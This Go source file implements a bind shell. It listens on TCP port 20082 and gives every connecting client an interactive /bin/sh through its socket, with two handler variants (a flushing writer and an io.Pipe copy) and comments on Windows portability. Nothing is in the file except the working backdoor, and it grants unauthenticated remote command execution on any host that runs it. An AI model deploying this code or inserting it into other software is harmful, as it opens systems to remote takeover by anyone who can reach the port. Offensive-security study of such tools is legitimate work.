package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

// Flusher wraps bufio.Writer, explicitly flushing on all entries.
type Flusher struct {
	w *bufio.Writer
}

// NewFlusher creates a new Flusher from io.Writer
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

// Write writes bytes and explicitly flushes buffer
func (f *Flusher) Write(b []byte) (int, error) {
	count, err := f.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := f.w.Flush(); err != nil {
		return -1, err
	}

	return count, err
}

func handleWithFlusher(conn net.Conn) {
	defer conn.Close()
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout
	// For Windows use exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")

	// Set stdin to our connection
	cmd.Stdin = conn

	// Create a Flusher from connection to use for stdout
	// This ensures stdout is flushed adequately and sent via net.Conn
	cmd.Stdout = NewFlusher(conn)
	// for linux systems, the following line works as well. However for windows, it doesn't. Hence, the need for Flusher
	//cmd.Stdout = conn

	// Run the command
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func handleWithPipes(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout
	// For Windows use exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")

	// Set stdin to our connection
	rp, wp := io.Pipe() // creates both a reader and a writer that are synchronously connected. Any data written to the
	// writer (wp in this example) will be read by the reader (rp)
	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20082")
	fmt.Println("server is listening on port 20082...")
	if err != nil {
		log.Fatalln(err)
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("error accepting connection")
			break
		}
		//go handleWithFlusher(conn)
		go handleWithPipes(conn)
	}
}
